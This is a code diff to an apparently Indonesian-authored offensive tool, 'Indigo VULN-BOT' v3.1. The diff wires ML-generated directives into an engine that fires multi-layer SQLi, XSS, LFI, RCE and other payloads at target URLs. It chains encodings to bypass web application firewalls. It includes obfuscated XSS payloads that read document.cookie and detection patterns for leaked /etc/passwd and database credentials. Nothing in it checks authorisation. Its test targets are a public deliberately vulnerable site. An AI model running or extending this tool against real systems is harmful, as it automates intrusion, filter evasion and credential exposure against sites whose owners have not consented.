@@ -29,6 +29,12 @@ Advanced vulnerability payload generator dengan:
    - Before/after response comparison
    - Payload effectiveness ranking
 
+5. [v3.1] ML KNOWLEDGE INTEGRATION (File 3)
+   - Receives strategic directives from indigo_ml_knowledge.py
+   - Strict Directive Schema Validator (grammar, constraints, validation rules)
+   - ML-driven evasion chains and complexity recommendations
+   - Fallback to raw findings mode if File 3 not available
+
 CHANGELOG v3.0:
 - Multi-layer payload generation (short → ultra-long)
 - Filter/validation/sanitization bypass engine
@@ -36,6 +42,13 @@ CHANGELOG v3.0:
 - Advanced logging with execution proof
 - Statistical confidence scoring
 - Response fingerprinting & comparison
+
+CHANGELOG v3.1 (ML KNOWLEDGE INTEGRATION):
+- Full integration with indigo_ml_knowledge.py (File 3)
+- DirectiveSchemaValidator for strict JSON validation
+- ML-driven evasion recommendations from File 3
+- Upgraded pattern validation rules (stricter constraints)
+- Enhanced payload generator reads directives from File 3
 
 Dependency: Diimpor oleh indigo_scr.py (File 1)
 """
@@ -52,6 +65,7 @@ import math
 import base64
 import difflib
 import itertools
+import traceback
 from datetime import datetime
 from urllib.parse import urlparse, urlencode, quote, unquote
 from collections import defaultdict, Counter
@@ -169,6 +183,216 @@ try:
 except ImportError:
     HAS_REQUESTS = False
     req_lib = None
+
+
+# ============================================================
+# INTEGRATION BRIDGE: Import File 3 (ML Knowledge)
+# ============================================================
+try:
+    from indigo_ml_knowledge import MLKnowledgeMaster
+    HAS_ML_KNOWLEDGE = True
+except ImportError:
+    HAS_ML_KNOWLEDGE = False
+
+
+# ============================================================
+# DIRECTIVE SCHEMA VALIDATOR (v3.1 - Strict JSON Validation from File 3)
+# ============================================================
+class DirectiveSchemaValidator:
+    """
+    Memvalidasi output JSON dari ML Knowledge (File 3) dengan aturan ketat.
+    Memastikan grammar, constraint, dan schema sesuai sebelum dieksekusi.
+    
+    VALIDATION RULES:
+    1. Root must be dict with 'tasks' key (list)
+    2. Each task must have: vuln_type, url, parameter
+    3. vuln_type must be in VALID_VULN_TYPES enum
+    4. url must start with http:// or https://
+    5. method must be valid HTTP method
+    6. recommended_complexity must be valid enum values
+    7. recommended_evasion must be known techniques
+    8. priority must be: low, medium, high, critical
+    9. context dict is optional but must be dict if present
+    10. waf_detected must be boolean if present
+    """
+    
+    VALID_VULN_TYPES = {
+        "sqli", "xss", "lfi", "rce", "ssti", "ssrf", "xxe", 
+        "crlf", "open_redirect", "csrf", "clickjacking"
+    }
+    VALID_METHODS = {"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}
+    VALID_COMPLEXITY = {"SHORT", "MEDIUM", "LONG", "ULTRA_LONG", "MULTI_LAYER"}
+    VALID_PRIORITIES = {"low", "medium", "high", "critical"}
+    VALID_EVASION_TECHNIQUES = {
+        "url_encode", "double_url", "triple_url", "unicode", "hex",
+        "base64", "html_entity", "html_entity_hex", "js_escape",
+        "null_byte", "whitespace", "whitespace_padding", "comment_sql",
+        "comment_html", "comment_injection", "case_mutation", "case_mut",
+        "newline", "tab", "rot13", "unicode_norm", "concatenation",
+        "obfuscation", "char_encoding", "nested_encoding",
+    }
+
+    @classmethod
+    def validate_directives(cls, directives: Any) -> Tuple[bool, List[Dict], List[str]]:
+        """
+        Validate the entire directives payload from ML Knowledge.
+        Returns: (is_valid, valid_tasks, errors)
+        """
+        errors = []
+        valid_tasks = []
+
+        if not isinstance(directives, dict):
+            return False, [], ["Root element must be a dictionary"]
+
+        tasks = directives.get("tasks", [])
+        if not isinstance(tasks, list):
+            return False, [], ["'tasks' must be a list"]
+
+        if len(tasks) == 0:
+            return False, [], ["'tasks' list is empty — nothing to execute"]
+
+        for i, task in enumerate(tasks):
+            task_errors = cls._validate_task(task, i)
+            if task_errors:
+                errors.extend(task_errors)
+            else:
+                valid_tasks.append(cls._normalize_task(task))
+
+        is_valid = len(errors) == 0 and len(valid_tasks) > 0
+        return is_valid, valid_tasks, errors
+
+    @classmethod
+    def _validate_task(cls, task: Any, index: int) -> List[str]:
+        errs = []
+        prefix = f"Task[{index}]"
+
+        if not isinstance(task, dict):
+            return [f"{prefix}: Must be a dictionary"]
+
+        # Required: vuln_type
+        if "vuln_type" not in task:
+            errs.append(f"{prefix}: Missing required field 'vuln_type'")
+        elif not isinstance(task["vuln_type"], str):
+            errs.append(f"{prefix}: 'vuln_type' must be a string")
+        elif task["vuln_type"].lower().strip() not in cls.VALID_VULN_TYPES:
+            errs.append(f"{prefix}: Invalid vuln_type '{task['vuln_type']}'. "
+                       f"Valid: {cls.VALID_VULN_TYPES}")
+
+        # Required: url
+        if "url" not in task:
+            errs.append(f"{prefix}: Missing required field 'url'")
+        elif not isinstance(task["url"], str):
+            errs.append(f"{prefix}: 'url' must be a string")
+        elif not task["url"].strip().startswith(("http://", "https://")):
+            errs.append(f"{prefix}: Invalid URL format '{task['url'][:50]}' — must start with http:// or https://")
+        elif len(task["url"]) > 2048:
+            errs.append(f"{prefix}: URL exceeds 2048 chars")
+
+        # Required: parameter
+        if "parameter" not in task:
+            errs.append(f"{prefix}: Missing required field 'parameter'")
+        elif not isinstance(task["parameter"], str):
+            errs.append(f"{prefix}: 'parameter' must be a string")
+        elif len(task["parameter"].strip()) == 0:
+            errs.append(f"{prefix}: 'parameter' cannot be empty")
+
+        # Optional: method
+        if "method" in task:
+            if not isinstance(task["method"], str):
+                errs.append(f"{prefix}: 'method' must be a string")
+            elif task["method"].upper() not in cls.VALID_METHODS:
+                errs.append(f"{prefix}: Invalid HTTP method '{task['method']}'. Valid: {cls.VALID_METHODS}")
+
+        # Optional: priority
+        if "priority" in task:
+            if not isinstance(task["priority"], str):
+                errs.append(f"{prefix}: 'priority' must be a string")
+            elif task["priority"].lower() not in cls.VALID_PRIORITIES:
+                errs.append(f"{prefix}: Invalid priority '{task['priority']}'. Valid: {cls.VALID_PRIORITIES}")
+
+        # Optional: recommended_complexity
+        if "recommended_complexity" in task:
+            comps = task["recommended_complexity"]
+            if not isinstance(comps, list):
+                errs.append(f"{prefix}: 'recommended_complexity' must be a list")
+            else:
+                for c in comps:
+                    if not isinstance(c, str) or c.upper() not in cls.VALID_COMPLEXITY:
+                        errs.append(f"{prefix}: Invalid complexity '{c}'. Valid: {cls.VALID_COMPLEXITY}")
+
+        # Optional: recommended_evasion
+        if "recommended_evasion" in task:
+            evs = task["recommended_evasion"]
+            if not isinstance(evs, list):
+                errs.append(f"{prefix}: 'recommended_evasion' must be a list")
+            else:
+                for e in evs:
+                    if not isinstance(e, str) or e.lower() not in cls.VALID_EVASION_TECHNIQUES:
+                        errs.append(f"{prefix}: Unknown evasion technique '{e}'. Valid: {cls.VALID_EVASION_TECHNIQUES}")
+
+        # Optional: waf_detected
+        if "waf_detected" in task:
+            if not isinstance(task["waf_detected"], bool):
+                errs.append(f"{prefix}: 'waf_detected' must be boolean")
+
+        # Optional: context
+        if "context" in task:
+            if not isinstance(task["context"], dict):
+                errs.append(f"{prefix}: 'context' must be a dictionary")
+
+        # Optional: confidence
+        if "confidence" in task:
+            conf = task["confidence"]
+            if not isinstance(conf, (int, float)):
+                errs.append(f"{prefix}: 'confidence' must be numeric")
+            elif conf < 0.0 or conf > 1.0:
+                errs.append(f"{prefix}: 'confidence' must be between 0.0 and 1.0")
+
+        # Optional: max_payloads
+        if "max_payloads" in task:
+            mp = task["max_payloads"]
+            if not isinstance(mp, int):
+                errs.append(f"{prefix}: 'max_payloads' must be integer")
+            elif mp < 1 or mp > 500:
+                errs.append(f"{prefix}: 'max_payloads' must be between 1 and 500")
+
+        return errs
+
+    @classmethod
+    def _normalize_task(cls, task: Dict) -> Dict:
+        """Normalize task data to strict internal schema."""
+        normalized = {
+            "task_id": task.get("task_id", 
+                       f"task_{hashlib.md5(json.dumps(task, sort_keys=True, default=str).encode()).hexdigest()[:8]}"),
+            "vuln_type": task["vuln_type"].lower().strip(),
+            "url": task["url"].strip(),
+            "parameter": task["parameter"].strip(),
+            "method": task.get("method", "GET").upper(),
+            "priority": task.get("priority", "medium").lower(),
+            "waf_detected": bool(task.get("waf_detected", False)),
+            "waf_name": str(task.get("waf_name", "")).lower(),
+            "recommended_evasion": [e.lower().strip() for e in task.get("recommended_evasion", [])],
+            "recommended_complexity": [c.upper().strip() for c in task.get("recommended_complexity", 
+                                       ["SHORT", "MEDIUM", "LONG", "ULTRA_LONG", "MULTI_LAYER"])],
+            "context": task.get("context", {}),
+            "evidence": str(task.get("evidence", "")),
+            "base_payload_hint": str(task.get("base_payload_hint", "")),
+            "confidence": float(task.get("confidence", 0.8)),
+            "max_payloads": int(task.get("max_payloads", 80)),
+            "technologies": list(task.get("technologies", [])),
+            "source": str(task.get("source", "ml_knowledge")),
+            "severity": str(task.get("severity", "Medium")),
+            "name": str(task.get("name", "")),
+        }
+        
+        # Merge technologies from context if present
+        ctx_techs = normalized["context"].get("technologies", [])
+        if ctx_techs and isinstance(ctx_techs, list):
+            for t in ctx_techs:
+                if t not in normalized["technologies"]:
+                    normalized["technologies"].append(t)
+        
+        return normalized
 
 
 # ============================================================
@@ -331,7 +555,7 @@ EXECUTION_PATTERNS = {
         r"daemon:x:\d+:\d+:daemon",
         r"$$boot loader$$",
         r"$$fonts$$",
-        r"<?php\s",
+        r"<\?php\s",
         r"DB_HOST\s*=\s*['\"]",
         r"DB_NAME\s*=\s*['\"]",
         r"DB_USER\s*=\s*['\"]",
@@ -1061,7 +1285,7 @@ class MultiLayerPayloadGenerator:
                     "<body onload=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">",
                     "<input onfocus=\"eval(atob('YWxlcnQoMSk='))\" autofocus>",
                     "javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))",
-                    "<img src=x onerror=\"new Function(atob('YWxlcnQoMSk='))()\" >",
+                    "<img src=x onerror=\"new Function(atob('YWxlcnQoMSk='))()\">",
                     "<svg><animate onbegin=\"eval(atob('YWxlcnQoMSk='))\" attributeName=x>",
                     "<details open ontoggle=\"new Function(atob('YWxlcnQoMSk='))()\">",
                 ],
@@ -1518,10 +1742,20 @@ class MultiLayerPayloadGenerator:
         self,
         vuln_type: str,
         context: Dict[str, Any],
-        max_total: int = None
+        max_total: int = None,
+        ml_directive: Dict = None
     ) -> List[MultiLayerPayload]:
-        """Generate all payload variants untuk satu vulnerability."""
+        """
+        Generate all payload variants untuk satu vulnerability.
+        
+        [v3.1] Now accepts ml_directive from File 3 to influence generation.
+        """
         max_total = max_total or self.config["max_payloads_per_finding"]
+        
+        # Override max_total from ML directive if present
+        if ml_directive and ml_directive.get("max_payloads"):
+            max_total = min(ml_directive["max_payloads"], 500)
+        
         all_payloads = []
 
         # Generate per complexity level
@@ -1537,6 +1771,11 @@ class MultiLayerPayloadGenerator:
         all_payloads.extend(ultra)
         all_payloads.extend(multi)
 
+        # [v3.1] Generate ML-directed payloads (from File 3 directives)
+        if ml_directive:
+            ml_payloads = self._generate_ml_directed_payloads(vuln_type, context, ml_directive)
+            all_payloads.extend(ml_payloads)
+
         # Deduplicate
         seen = set()
         unique = []
@@ -1549,6 +1788,109 @@ class MultiLayerPayloadGenerator:
         unique.sort(key=lambda x: x.confidence, reverse=True)
 
         return unique[:max_total]
+
+    def _generate_ml_directed_payloads(
+        self, 
+        vuln_type: str, 
+        context: Dict, 
+        directive: Dict
+    ) -> List[MultiLayerPayload]:
+        """
+        [v3.1] Generate payloads specifically directed by ML Knowledge (File 3).
+        Uses recommended_evasion chains and base_payload_hint from directives.
+        """
+        payloads = []
+        enc_methods = self._get_encoding_methods()
+        
+        recommended_evasion = directive.get("recommended_evasion", [])
+        base_hint = directive.get("base_payload_hint", "")
+        waf_detected = directive.get("waf_detected", False)
+        waf_name = directive.get("waf_name", "")
+        recommended_complexity = directive.get("recommended_complexity", [])
+        
+        # Get base payloads
+        base_payloads = self._get_base_payloads(vuln_type, "medium")
+        base_payloads += self._get_base_payloads(vuln_type, "long")
+        base_payloads += self._get_base_payloads(vuln_type, "ultra_long")
+        
+        # If ML provides a specific hint, add it as first base
+        if base_hint:
+            base_payloads.insert(0, base_hint)
+        
+        # Map File 3 evasion technique names to our encoding method names
+        evasion_map = {
+            "url_encode": "url",
+            "double_url": "double_url",
+            "triple_url": "triple_url",
+            "unicode": "unicode",
+            "hex": "hex",
+            "base64": "base64",
+            "html_entity": "html_entity",
+            "html_entity_hex": "html_entity_hex",
+            "js_escape": "js_escape",
+            "null_byte": "null_byte",
+            "whitespace": "whitespace",
+            "whitespace_padding": "whitespace",
+            "comment_sql": "comment_sql",
+            "comment_html": "comment_html",
+            "comment_injection": "comment_sql",
+            "case_mutation": "case_mut",
+            "case_mut": "case_mut",
+            "newline": "newline",
+            "tab": "tab",
+            "rot13": "rot13",
+            "unicode_norm": "unicode_norm",
+            "nested_encoding": "double_url",  # Nested = multi encoding
+        }
+        
+        for bp in base_payloads:
+            # Apply ML-recommended evasion chain
+            if recommended_evasion:
+                # Map technique names
+                mapped_chain = []
+                for tech in recommended_evasion:
+                    mapped = evasion_map.get(tech.lower(), tech.lower())
+                    if mapped in enc_methods:
+                        mapped_chain.append(mapped)
+                
+                if mapped_chain:
+                    # Apply chain
+                    encoded = bp
+                    applied_chain = []
+                    for enc_name in mapped_chain:
+                        try:
+                            encoded = enc_methods[enc_name](encoded)
+                            applied_chain.append(enc_name)
+                        except:
+                            continue
+                    
+                    if encoded != bp and len(encoded) < self.config["max_payload_length"]:
+                        payloads.append(MultiLayerPayload(
+                            original=bp, payload=encoded,
+                            complexity=PayloadComplexity.LONG,
+                            layers=["raw"] + [f"ml_encode:{e}" for e in applied_chain],
+                            techniques=[BypassTechnique.ENCODING, BypassTechnique.WAF_BYPASS],
+                            encoding_chain=applied_chain,
+                            vuln_type=vuln_type,
+                            confidence=0.85,
+                            metadata={"source": "ml_knowledge_directive", "chain": applied_chain}
+                        ))
+            
+            # If WAF detected, generate aggressive bypass based on waf_name from File 3
+            if waf_detected and waf_name:
+                waf_payload = self._generate_waf_bypass_payload(bp, vuln_type, context)
+                if waf_payload and len(waf_payload) < self.config["max_payload_length"]:
+                    payloads.append(MultiLayerPayload(
+                        original=bp, payload=waf_payload,
+                        complexity=PayloadComplexity.ULTRA_LONG,
+                        layers=["raw", f"waf_bypass:{waf_name}", "multi_encode"],
+                        techniques=[BypassTechnique.WAF_BYPASS, BypassTechnique.ENCODING],
+                        vuln_type=vuln_type,
+                        confidence=0.80,
+                        metadata={"source": "ml_knowledge_waf_directive", "waf": waf_name}
+                    ))
+        
+        return payloads
 
     def get_stats(self) -> Dict[str, int]:
         return dict(self.generation_stats)
@@ -2234,21 +2576,42 @@ class VulnBotEngine:
 
         os.makedirs(self.config["output_dir"], exist_ok=True)
 
-    def process_finding(self, finding: Dict[str, Any]) -> VulnBotResult:
-        """Process single finding with multi-layer payloads and ML analysis."""
+    def process_finding(self, finding: Dict[str, Any], ml_directive: Dict = None) -> VulnBotResult:
+        """
+        Process single finding with multi-layer payloads and ML analysis.
+        
+        [v3.1] Now accepts ml_directive from File 3 for strategic guidance.
+        """
         print(f"\n\033[33m{'='*58}")
         print(f"  VULN-BOT: {finding.get('name', 'Unknown')}")
         print(f"  Type: {finding.get('vuln_type', 'unknown')} | "
               f"Severity: {finding.get('severity', 'unknown')}")
+        if ml_directive:
+            print(f"  ML Directive: YES | Priority: {ml_directive.get('priority', 'medium')}")
+            if ml_directive.get('recommended_evasion'):
+                print(f"  ML Evasion: {', '.join(ml_directive['recommended_evasion'])}")
         print(f"{'='*58}\033[0m")
 
         vuln_type = finding.get("vuln_type", "unknown").lower()
         target_url = finding.get("url", "")
         param = finding.get("context", {}).get("parameter", "test")
+        
+        # Build context from finding + ML directive
         context = {
             "waf_detected": finding.get("waf_detected", False),
             "technologies": finding.get("technologies", []),
         }
+        
+        # [v3.1] Merge ML directive context
+        if ml_directive:
+            if ml_directive.get("waf_detected"):
+                context["waf_detected"] = True
+            if ml_directive.get("waf_name"):
+                context["waf_name"] = ml_directive["waf_name"]
+            if ml_directive.get("technologies"):
+                context["technologies"] = list(set(
+                    context["technologies"] + ml_directive["technologies"]
+                ))
 
         # Collect baseline
         print(f"\n  [*] Collecting baseline responses...")
@@ -2259,9 +2622,16 @@ class VulnBotEngine:
 
         # Generate multi-layer payloads
         print(f"\n  [*] Generating multi-layer payloads...")
+        
+        # Determine max payloads
+        max_total = self.config["max_payloads_per_finding"]
+        if ml_directive and ml_directive.get("max_payloads"):
+            max_total = min(ml_directive["max_payloads"], 500)
+        
         payloads = self.payload_gen.generate_all_payloads(
             vuln_type, context,
-            max_total=self.config["max_payloads_per_finding"]
+            max_total=max_total,
+            ml_directive=ml_directive  # [v3.1] Pass ML directive
         )
         print(f"  [OK] Generated {len(payloads)} payloads")
 
@@ -2289,7 +2659,8 @@ class VulnBotEngine:
 
             # Test payload
             test_result = self.http_tester.test_payload(
-                payload.payload, target_url, param
+                payload.payload, target_url, param,
+                method=ml_directive.get("method", "GET") if ml_directive else "GET"
             )
 
             if test_result["error"]:
@@ -2347,6 +2718,7 @@ class VulnBotEngine:
                 "raw_html_detected": response_analysis.raw_html_detected,
                 "blocked_detected": response_analysis.blocked_detected,
                 "fingerprint": response_analysis.response_fingerprint,
+                "ml_directed": payload.metadata.get("source", "") == "ml_knowledge_directive",
             }
 
             all_results.append(result_record)
@@ -2435,6 +2807,7 @@ class VulnBotEngine:
             ml_analysis={
                 "model_trained": self.ml_analyzer.trained,
                 "training_samples": len(self.ml_analyzer.training_data),
+                "ml_directive_used": ml_directive is not None,
             },
             statistical_analysis=stats,
             recommendations=recommendations,
@@ -2591,17 +2964,40 @@ class VulnBotEngine:
             for rec in result.recommendations:
                 print(f"    {rec}")
 
-    def process_multiple_findings(self, findings: List[Dict]) -> List[VulnBotResult]:
-        """Process multiple findings."""
+    def process_multiple_findings(self, findings: List[Dict], ml_directives: List[Dict] = None) -> List[VulnBotResult]:
+        """
+        Process multiple findings.
+        
+        [v3.1] Now accepts ml_directives list from File 3.
+        Each directive is matched to its corresponding finding by url + parameter.
+        """
         print(f"\n\033[1;36m{'='*60}")
         print(f"  INDIGO VULN-BOT v3.0 - Multi-Layer AI Payload Engine")
+        if ml_directives:
+            print(f"  ML Knowledge Integration: ACTIVE ({len(ml_directives)} directives)")
         print(f"  Processing {len(findings)} findings")
         print(f"{'='*60}\033[0m")
+
+        # Build directive lookup: (url, parameter) -> directive
+        directive_map = {}
+        if ml_directives:
+            for d in ml_directives:
+                key = (d.get("url", ""), d.get("parameter", ""))
+                directive_map[key] = d
 
         results = []
         for i, finding in enumerate(findings, 1):
             print(f"\n\033[36m[{i}/{len(findings)}]\033[0m")
-            result = self.process_finding(finding)
+            
+            # Match finding to ML directive
+            finding_url = finding.get("url", "")
+            finding_param = finding.get("context", {}).get("parameter", "")
+            ml_dir = directive_map.get((finding_url, finding_param))
+            
+            if ml_dir:
+                print(f"  [ML] Matched directive from ML Knowledge")
+            
+            result = self.process_finding(finding, ml_directive=ml_dir)
             results.append(result)
 
         # Final summary
@@ -2710,6 +3106,159 @@ class VulnBotEngine:
 
 
 # ============================================================
+# PIPELINE ORCHESTRATOR (File 1 → File 3 → File 2 Bridge)
+# ============================================================
+class IndigoPipelineOrchestrator:
+    """
+    Orchestrates the full pipeline:
+    1. Receives scan results from File 1
+    2. Sends to ML Knowledge (File 3) for strategic analysis
+    3. Validates directives with DirectiveSchemaValidator
+    4. Converts directives to findings format
+    5. Executes via VulnBotEngine
+    """
+    
+    def __init__(self, config: Dict = None):
+        self.config = config or VULN_BOT_CONFIG
+        self.engine = VulnBotEngine(self.config)
+        os.makedirs(self.config["output_dir"], exist_ok=True)
+
+    def run_full_pipeline(self, scan_results: Dict) -> Dict:
+        """
+        Full pipeline: File 1 results → File 3 ML Knowledge → File 2 Execution
+        """
+        print(f"\n\033[1;36m{'='*64}")
+        print(f"  INDIGO PIPELINE: Scanner → ML Knowledge → VulnBot Executor")
+        print(f"{'='*64}\033[0m")
+
+        # STEP 1: Get Strategic Directives from ML Knowledge (File 3)
+        directives = None
+        valid_tasks = []
+        
+        if HAS_ML_KNOWLEDGE:
+            print(f"\n  [*] Sending scan data to ML Knowledge Master (File 3)...")
+            try:
+                ml_master = MLKnowledgeMaster()
+                directives = ml_master.analyze(scan_results)
+                print(f"  [+] ML Knowledge analysis complete.")
+                
+                # STEP 2: Validate Directives
+                print(f"\n  [*] Validating directive schema...")
+                is_valid, valid_tasks, errors = DirectiveSchemaValidator.validate_directives(directives)
+                
+                if errors:
+                    print(f"  [!] Schema validation found {len(errors)} error(s):")
+                    for err in errors[:5]:
+                        print(f"      - {err}")
+                
+                if not valid_tasks:
+                    print(f"  [!] No valid tasks from ML Knowledge. Falling back to raw findings.")
+                    valid_tasks = []
+                else:
+                    print(f"  [+] {len(valid_tasks)} valid directive(s) ready for execution.")
+                    
+            except Exception as e:
+                print(f"  [!] ML Knowledge error: {e}")
+                traceback.print_exc()
+                valid_tasks = []
+        else:
+            print(f"\n  [!] File 3 (indigo_ml_knowledge.py) not found. Standalone mode.")
+
+        # STEP 3: Build findings list (from directives or raw scan results)
+        if valid_tasks:
+            findings = self._directives_to_findings(valid_tasks)
+            ml_directives = valid_tasks
+        else:
+            # Fallback to raw findings from File 1
+            findings = scan_results.get("findings_for_ml", [])
+            ml_directives = None
+
+        if not findings:
+            print(f"\n  [!] No findings to process. Pipeline terminated.")
+            return {"status": "no_findings", "results": []}
+
+        # STEP 4: Execute
+        print(f"\n  [*] VulnBot Engine starting execution...")
+        results = self.engine.process_multiple_findings(findings, ml_directives=ml_directives)
+        results_file = self.engine.save_results(results)
+
+        # STEP 5: Build output
+        output = self._build_pipeline_output(results, valid_tasks, results_file)
+        
+        return output
+
+    def _directives_to_findings(self, directives: List[Dict]) -> List[Dict]:
+        """Convert validated ML directives to VulnBot findings format."""
+        findings = []
+        for d in directives:
+            finding = {
+                "vuln_type": d["vuln_type"],
+                "name": d.get("name", f"{d['vuln_type'].upper()} via ML Knowledge"),
+                "severity": d.get("severity", "High"),
+                "url": d["url"],
+                "context": {
+                    "parameter": d["parameter"],
+                    "param_type": "url" if d.get("method", "GET") == "GET" else "body",
+                },
+                "evidence": d.get("evidence", ""),
+                "waf_detected": d.get("waf_detected", False),
+                "technologies": d.get("technologies", []),
+                "method": d.get("method", "GET"),
+                "ml_directive": d,
+            }
+            findings.append(finding)
+        return findings
+
+    def _build_pipeline_output(
+        self, 
+        results: List[VulnBotResult], 
+        directives: List[Dict], 
+        results_file: str
+    ) -> Dict:
+        """Build final pipeline output."""
+        output = {
+            "status": "complete",
+            "ml_knowledge_used": len(directives) > 0,
+            "directives_received": len(directives),
+            "findings_processed": len(results),
+            "results_file": results_file,
+            "results": [],
+        }
+
+        total_gen = 0
+        total_tested = 0
+        total_validated = 0
+
+        for r in results:
+            total_gen += r.payloads_generated
+            total_tested += r.payloads_tested
+            total_validated += r.payloads_validated
+
+            output["results"].append({
+                "finding": r.finding,
+                "payloads_generated": r.payloads_generated,
+                "payloads_tested": r.payloads_tested,
+                "payloads_validated": r.payloads_validated,
+                "best_payload": {
+                    "payload": r.best_payload.payload[:200] if r.best_payload else None,
+                    "complexity": r.best_payload.complexity.value if r.best_payload else None,
+                    "method": r.best_payload.complexity.value if r.best_payload else None,
+                    "context_score": r.best_response.confidence if r.best_response else 0.0,
+                } if r.best_payload else {},
+                "poc_files": r.poc_files,
+            })
+
+        output["summary"] = {
+            "total_payloads_generated": total_gen,
+            "total_payloads_tested": total_tested,
+            "total_payloads_validated": total_validated,
+            "overall_validation_rate": total_validated / total_tested if total_tested > 0 else 0.0,
+        }
+
+        return output
+
+
+# ============================================================
 # ENTRY POINT
 # ============================================================
 def run_vuln_bot(findings: List[Dict], config: Dict = None) -> List[Dict]:
@@ -2751,42 +3300,108 @@ def run_vuln_bot(findings: List[Dict], config: Dict = None) -> List[Dict]:
     return output
 
 
+def run_with_ml_knowledge(scan_results: Dict, config: Dict = None) -> Dict:
+    """
+    [v3.1] Primary entry point: Full pipeline with ML Knowledge integration.
+    Called by File 1 after Y/N prompt, or standalone with --scan-file.
+    
+    Pipeline: File 1 (Scan) → File 3 (ML Knowledge) → File 2 (VulnBot)
+    """
+    cfg = config or VULN_BOT_CONFIG
+    orchestrator = IndigoPipelineOrchestrator(cfg)
+    return orchestrator.run_full_pipeline(scan_results)
+
+
 # ============================================================
 # STANDALONE MODE
 # ============================================================
 if __name__ == "__main__":
-    print("\n\033[36m" + "=" * 58)
-    print("  Indigo VULN-BOT v3.0 - Standalone Mode")
-    print("=" * 58 + "\033[0m\n")
+    import argparse
+    
+    parser = argparse.ArgumentParser(
+        description="Indigo VULN-BOT v3.0 - ML-Integrated Payload Generator & Executor"
+    )
+    parser.add_argument(
+        "--scan-file",
+        help="Path to JSON scan results from File 1 (indigo_scr.py)"
+    )
+    parser.add_argument(
+        "--output",
+        default="./vuln_bot_results",
+        help="Output directory for results and PoCs"
+    )
+    parser.add_argument(
+        "--direct",
+        action="store_true",
+        help="Run directly with test findings (no scan file needed)"
+    )
+    args = parser.parse_args()
 
-    test_findings = [
-        {
-            "vuln_type": "xss",
-            "name": "Cross Site Scripting (Reflected)",
-            "severity": "High",
-            "url": "http://testphp.vulnweb.com/search.php?test=query",
-            "context": {"parameter": "test", "param_type": "url"},
-            "evidence": "<script>alert",
-            "technologies": ["php", "apache"],
-            "waf_detected": False,
-        },
-        {
-            "vuln_type": "sqli",
-            "name": "SQL Injection",
-            "severity": "High",
-            "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
-            "context": {"parameter": "cat", "param_type": "url"},
-            "evidence": "' OR '1'='1",
-            "technologies": ["mysql", "php"],
-            "waf_detected": False,
-        },
-    ]
+    if args.scan_file:
+        print(f"\n[*] Loading scan results from: {args.scan_file}")
+        try:
+            with open(args.scan_file, "r", encoding="utf-8") as f:
+                scan_data = json.load(f)
+            
+            # Override output dir
+            cfg = dict(VULN_BOT_CONFIG)
+            cfg["output_dir"] = args.output
+            os.makedirs(args.output, exist_ok=True)
+            
+            # Run full pipeline (File 3 → File 2)
+            result = run_with_ml_knowledge(scan_data, cfg)
+            print(f"\n[+] Pipeline complete. Status: {result.get('status')}")
+            
+        except FileNotFoundError:
+            print(f"[!] File not found: {args.scan_file}")
+            sys.exit(1)
+        except json.JSONDecodeError as e:
+            print(f"[!] Invalid JSON: {e}")
+            sys.exit(1)
+            
+    elif args.direct:
+        print("\n\033[36m" + "=" * 58)
+        print("  Indigo VULN-BOT v3.0 - Standalone Mode (Direct)")
+        print("=" * 58 + "\033[0m\n")
 
-    results = run_vuln_bot(test_findings)
+        test_findings = [
+            {
+                "vuln_type": "xss",
+                "name": "Cross Site Scripting (Reflected)",
+                "severity": "High",
+                "url": "http://testphp.vulnweb.com/search.php?test=query",
+                "context": {"parameter": "test", "param_type": "url"},
+                "evidence": "<script>alert",
+                "technologies": ["php", "apache"],
+                "waf_detected": False,
+            },
+            {
+                "vuln_type": "sqli",
+                "name": "SQL Injection",
+                "severity": "High",
+                "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+                "context": {"parameter": "cat", "param_type": "url"},
+                "evidence": "' OR '1'='1",
+                "technologies": ["mysql", "php"],
+                "waf_detected": False,
+            },
+        ]
 
-    print(f"\n\nGenerated {len(results)} result(s)")
-    for r in results:
-        print(f"\n  [{r['finding'].get('vuln_type', 'unknown').upper()}]")
-        print(f"    Generated: {r['payloads_generated']} payloads")
-        print(f"    Tested: {r['payloads_tested']} payloads")
-        print(f"    Validated: {r['payloads_validated']} payloads")
+        results = run_vuln_bot(test_findings)
+
+        print(f"\n\nGenerated {len(results)} result(s)")
+        for r in results:
+            print(f"\n  [{r['finding'].get('vuln_type', 'unknown').upper()}]")
+            print(f"    Generated: {r['payloads_generated']} payloads")
+            print(f"    Tested: {r['payloads_tested']} payloads")
+            print(f"    Validated: {r['payloads_validated']} payloads")
+    else:
+        print("\n  Indigo VULN-BOT v3.0 - ML-Integrated Payload Generator")
+        print("  " + "=" * 50)
+        print("\n  Usage:")
+        print("    python indigo_vuln_bot.py --scan-file <path_to_scan.json>")
+        print("    python indigo_vuln_bot.py --direct  (test with sample findings)")
+        print("\n  Or run via File 1 (indigo_scr.py) which will prompt Y/N")
+        print("  to automatically feed results through ML Knowledge → VulnBot.")
+        print("\n  Pipeline: File 1 (Scan) → File 3 (ML Knowledge) → File 2 (VulnBot)")
+        print()
